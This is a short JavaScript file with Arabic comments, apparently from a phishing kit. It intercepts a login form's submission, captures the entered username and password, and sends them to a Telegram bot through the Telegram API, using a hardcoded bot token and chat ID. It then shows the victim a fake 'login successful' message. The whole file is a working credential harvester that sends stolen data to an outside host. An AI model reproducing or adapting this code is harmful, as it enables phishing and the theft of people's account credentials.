document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault();

  var username = document.getElementById('username').value;
  var password = document.getElementById('password').value;

  // تأكد من أن البيانات ليست فارغة
  if (username && password) {
      var message = `اسم المستخدم: ${username}\nكلمة المرور: ${password}`;

      // إرسال البيانات إلى البوت عبر Telegram
      sendToTelegram(message);
  } else {
      alert('يرجى ملء جميع الحقول.');
  }
});

function sendToTelegram(message) {
  var token = '7320854870:AAFY55NYwESVfsxu_Mv7VtkjjUxMlbXD7pw';  // استبدل هذا برمز API الخاص بك
  var chat_id = '6903553583';      // استبدل هذا برقم الدردشة الخاص بك

  var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

  fetch(url)
      .then(response => response.json())
      .then(data => {
          if (data.ok) {
              alert('تم تسجيل الدخول بنجاح!');
          } else {
              alert('حدث خطأ أثناء إرسال البيانات.');
          }
      })
      .catch(error => {
          console.error('خطأ في الاتصال بـ Telegram:', error);
          alert('حدث خطأ أثناء الاتصال بـ Telegram.');
      });
}
